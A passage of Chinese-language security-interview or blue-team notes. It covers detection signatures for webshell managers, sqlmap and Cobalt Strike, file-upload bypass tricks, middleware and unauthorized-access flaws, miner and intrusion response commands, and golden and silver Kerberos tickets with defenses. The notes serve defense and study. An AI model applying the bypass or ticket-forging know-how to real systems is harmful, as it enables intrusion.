- 特征分析**Content-Type: application/octet-stream**这是一个**强特征**查阅资料可知octet-stream的意思是，**只能提交二进制，而且只能提交一个二进制**，如果提交文件的话，只能提交一个文件,后台接收参数只能有一个，而且只能是流（或者字节数组）
- 内置16个ua头,比较老,属于n年前的浏览器产品,现在没什么人用
- content-length长度为5720或5740(随Java版本改变)

#### 4.0特征

- 10个内置ua头随机选用
- 端口为49700左右，每次连接会递增
- PHPwebshell存在固定代码
- 请求头和响应头字节固定
- webshell存在默认字符串，为默认连接密码的MD5的前16位
- Content-Type不再是二进制，改成urlencoded，但是是弱特征

### 蚁剑

#### 强特征

- ua头为antsword xxx
- 蚁剑混淆加密后还有一个比较明显的特征,即为参数名大多以“\_0x......=”这种形式（下划线可替换），所以以\_0x开头的参数名也很可能就是恶意流量

#### 弱特征

可能有明文的@ini\_set("display\_errors","0")

### 菜刀

- payload为base64编码,有明显的字段z0，或z1,z2
- 有eval/asset
- 有$\_POST/$\_GET/$\_REQUEST

### sqlmap

- ua头有"sqlmap"字样,可以通过使用 sqlmap 自带的选项 `--user-agent`或 `--random-agent`，将报文头部的这一段信息进行隐蔽
- 可能存在xss测试语句
- 攻击具有规律性，payload有模板性

### 哥斯拉

无明确答案

回答1

- cookie结尾有分号
- 响应包结构特征:MD5前16位+base64+MD5后16位
- 注入内存马时有大量的URL请求,路径相同但参数不同,或者页面不存在但是返回200

回答2

- 发送一段固定的payload，响应为空
- 发送一段固定的test代码，执行结果为固定内容
- 发送一段固定代码来获得基本信息

### cs

50050端口、心跳包

- - - - - -

其他问题
----

### 文件读取漏洞常用协议

file:// gopher:// dict://

### 文件上传绕过方式

1. 前端js绕过: 最简单为直接禁用浏览器js,还可以抓包改文件名
2. 后端绕过: 
    1. 黑名单：点、空格点、php 123456、phphtml、分布式文件上传、文件流绕过
    2. 白名单：00截断、双文件名等

### 存在反序列化的中间件(Java)

- Jboos
- Shiro
- Apache tomcat
- Weblogic
- Fastjson

### 常见中间件漏洞

- IIS: PUT 漏洞、短文件名猜解、远程代码执行、解析漏洞
- Apache:解析漏洞、目录遍历
- Nginx:文件解析、目录遍历、CRLF 注入、目录穿越
- Tomcat:远程代码执行、war 后门文件部署
- JBoss:反序列化漏洞、war 后门文件部署
- WebLogic:反序列化漏洞、SSRF 任意文件上传、war 后门文件部署
- Apache Shiro反序列化漏洞: Shiro rememberMe( Shiro-550)、Shiro Padding Oracle Attack(Shiro-721)

### 常见未授权

- MongoDB未授权访问漏洞
- Redis未授权访问漏洞
- Memcached未授权访问漏洞
- JBOSS 未授权访问漏洞
- VNC未授权访问漏洞
- Docker未授权访问漏洞
- ZooKeeper未授权访问漏洞
- Rsync未授权访问漏洞

### 溯源思路

1. 恶意ip放微步，会自动进行域名反查
2. 如果ip为傀儡机、跳板机、代理机，放弃
3. 不是的话先判断cdn，使用超级ping、dns解析记录等方式，确定目标主机
4. 重复步骤1，或使用nslookup也能查到具体域名
5. 有域名查域名的whois信息，丢社工库进一步查询，没域名查是否有web服务
6. 无论有无域名，有web服务就反打查信息

### PHP危险函数

eval,asset,exec,shell\_exec,system

### 告警极多

1. 样本降噪,看200,看hw前有没有出现过,看是不是内部ip
2. 看行为,看攻击方式,是主动外连还是外连内
3. 看流量,看有没有奇怪的流量包,看有没有危险内容或函数

### 挖洞经历

- - - - - -

挖矿特征
----

### 被挖矿特征

CPU适用于接近100%并高居不下，或CPU占用过高操作迟缓，可以判定为挖矿

### Linux确认挖矿流程

1. top命令查看消耗系统资源较高的进程PID
2. 通过PID，利用`ps -ef -p PID`或`ps aux | grep PID`查找出系统进程的详细信息
3. 根据进程查询的信息找到文件位置
4. 停止服务 `systemctl stop xxx.service`
5. 通过kill 9 PID结束进程,有时可能要杀掉多个进程
6. 通过`find / -name 异常文件的文件名`查找相关的异常恶意文件
7. 通过`rm -rf 异常文件`删除所有异常文件
8. 检查定时任务`crontab -l`,清理定时任务通过`crontab -e`进入工作表删除定时任务

### Windows确认挖矿流程

1. 打开任务管理器,打开资源性能管理器或直接查看查看占用CPU资源较高的服务或进程的PID
2. 通过PID在任务管理器中的详细信息一栏找到对应程序,右键打开文件所在位置
3. 结束进程,关闭服务,删除对应文件,确认若有必要就先备份后删除文件
4. 通过`schtasks /query`命令查看定时任务,通过`schtasks /delete`命令删除定时任务

应急响应流程
------

### 入侵排查思路:

Windows:

1. 查看是否有弱口令，远程管理端口是否公开，查看是否有可疑账号：cmd输入lusrmgr.msc查看是否存在隐藏账号、克隆还在那更好，结合日志查看是否有远程连接，查看管理员登录时间
2. 检查异常端口、进程、连接 
    1. netstat -ano，查看网络连接，定位可疑连接
    2. tasklist|findstr “pid“定位进程
3. 检查启动项、计划任务、服务：运行窗口msconfig
4. 检查异常开机启动项：regedit
5. 检查系统补丁：运行窗口systeminfo
6. 日志分析：运行窗口eventvwr.msc

linux:

1. 用户信息文件/etc/passwd,看有没有特权用户
2. 查看当前登录用户(tty本地,pts远程)
3. 查看异常端口连接:netstat -antlp|more
4. 可疑进程:ps aux|grep pid
5. 结束进程:kill -9 pid
6. 检查定时任务:crontab -l

### 如果网站服务器被挂马

0.首先隔离  
1.取证，登录服务器，备份，检查服务器敏感目录，查毒（搜索后门文件-注意文件的时间， 用户，后缀等属性），调取日志（系统，中间件日志，WAF日志等）；  
2.处理，恢复备份（快照回滚最近一次），确定入侵方法（漏洞检测并进行修复）  
3.溯源，查入侵IP，入侵手法（网路攻击事件）的确定等  
4.记录，归档--------预防-事件检测-抑制-根除-恢复-跟踪-记录通用漏洞的应对等其他 安全应急事件

内网相关
----

### 金银票据

#### 黄金票据（Golden Ticket）

黄金票据就是伪造krbtgt用户的TGT票据，krbtgt用户是域控中用来管理发放票据的用户，拥有了该用户的权限，就可以伪造系统中的任意用户

利用前提

拿到域控(没错就是拿到域控QAQ),适合做权限维持有krbtgt用户的hash值(aeshash ntlmhash等都可以,后面指定一下算法就行了)

防御

- 限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机（不要让其他管理员登录到这些服务器）将所有其他权限委派给自定义管理员组。这大大降低了攻击者访问域控制器的Active Directory的ntds.dit。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码
- 禁用KRBTGT帐户，并保存当前的密码以及以前的密码。KRBTGT密码哈希用于在Kerberos票据上签署PAC并对TGT（身份验证票据）进行加密。如果使用不同的密钥（密码）对证书进行签名和加密，则DC（KDC）通过检查KRBTGT以前的密码来验证
- 建议定期更改KRBTGT密码（毕竟这是一个管理员帐户）。更改一次，然后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法
- 一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效。这将使所有Kerberos票据无效，并消除攻击者使用其KRBTGT创建有效金票的能力

#### 白银票据（Silver Ticket）

黄金票据是伪造TGT（门票发放票），而白银票据则是伪造ST（门票），这样的好处是门票不会经过KDC，从而更加隐蔽，但是伪造的门票只对部分服务起作用,如cifs（文件共享服务），mssql，winrm（windows远程管理），DNS等等结语

#### 简单了解黄金票据和白银票据：

黄金票据：是直接抓取域控中ktbtgt账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。  
白银票据：实际就是在抓取到了域控服务hash的情况下，在client端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。